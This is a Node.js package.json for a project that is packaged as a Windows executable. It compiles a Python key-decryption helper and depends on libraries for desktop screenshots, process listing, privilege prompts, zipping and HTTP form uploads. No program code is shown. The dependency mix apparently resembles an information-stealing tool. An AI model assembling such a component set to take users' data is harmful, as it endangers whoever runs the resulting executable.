{
  "main": "./index.js",
  "scripts": {
    "dev": "node index.js",
    "build": "yarn build:dkp && yarn build:ico && yarn build:exe",
    "build:exe": "nexe --build -i index.js --ico \"./icon.ico\"",
    "build:exe2": "pkg index.js -t node16-win-x64",
    "build:dkp": "cd util/decrypt-key && pyinstaller --onefile --distpath . decrypt_key.py",
    "build:ico": "png-to-ico assets/icon.png > icon.ico"
  },
  "dependencies": {
    "alert": "https://github.com/NetherMCtv/alert",
    "axios": "0.27.2",
    "filesize": "^10.0.6",
    "form-data": "^4.0.0",
    "jszip": "^3.10.1",
    "moment": "^2.29.4",
    "nexe": "^4.0.0-rc.2",
    "pkg": "^5.8.0",
    "ps-list": "^8.1.0",
    "screenshot-desktop": "^1.12.7",
    "sudo-prompt": "^9.2.1"
  },
  "devDependencies": {
    "@types/node": "^18.11.17",
    "@types/screenshot-desktop": "^1.12.0",
    "eslint": "8.22.0",
    "png-to-ico": "^2.1.8"
  }
}
